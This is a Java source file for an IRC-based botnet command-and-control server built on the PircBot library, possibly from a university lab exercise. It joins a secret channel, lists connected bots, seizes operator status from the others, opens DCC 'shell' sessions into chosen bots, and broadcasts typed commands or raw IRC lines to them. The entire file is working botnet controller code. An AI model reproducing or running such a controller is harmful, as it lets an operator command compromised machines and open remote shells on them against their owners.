import java.io.*;
import java.net.*;
import java.util.Scanner;
import java.util.UUID;
import org.jibble.pircbot.*;

public class BotnetServer extends PircBot {
	private static final boolean DEBUG = true;
	private static final String SERVER = "eve.cs.washington.edu";
	private static final String CHANNEL = "#hacktastic";
	private static final String NAME = "RandR";
	private static final int PORT = 6667;
	private static final int TIMEOUT = 10000;
	private Scanner input;
	
	public static void main(String[] args) {
		BotnetServer bn = new BotnetServer();
		bn.init();
	}
	
	public BotnetServer() {
		input = new Scanner(System.in);
		try {
			setVerbose(DEBUG);
			setName(NAME);
			setMessageDelay(0);
			connect(SERVER, PORT);
			joinChannel(CHANNEL);
			setMode(CHANNEL, "s");
			input = new Scanner(System.in);
		} catch (NickAlreadyInUseException e) {
			changeNick(NAME);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public void init() {
		System.out.print("Command: ");
		String message = input.nextLine();
		while(!message.toLowerCase().equalsIgnoreCase("q")) {
			write(message);
			System.out.print("Command: ");
			message = input.nextLine();
		}
	}
	
	protected void onMessage(String channel, String sender, String login, String hostname, String message) {
		System.out.println("<" + sender + ">: " + message);
	}
	
	public void write(String s) {
		if (s.toLowerCase().equals("list")) {
			listChannels();
		} else if (s.toLowerCase().equals("names")) {
			User[] bots = getUsers(CHANNEL);
			for (int i = 0; i < bots.length; i++) {
				System.out.println("\t" + bots[i].toString());
			}
		} else if (s.toLowerCase().equals("setop")) {
			op(CHANNEL, NAME);
			User[] bots = getUsers(CHANNEL);
			for (int i = 0; i < bots.length; i++) {
				if (!bots[i].getNick().equals(NAME)) {
					deOp(CHANNEL, bots[i].toString());
				}
			}
			op(CHANNEL, NAME);
		} else if (s.toLowerCase().startsWith("shell")) {
			String[] parts = s.split(" ");
			if (parts.length >= 2) {
				dccSendChatRequest(parts[1], TIMEOUT);
			} else {
				System.out.println("Shell: requires the nick of the bot to sheel into");
			}
		} else if (s.startsWith(":")) {
			sendRawLine(s.substring(1));
		} else {
			sendMessage(CHANNEL, s);
		}
	}
}
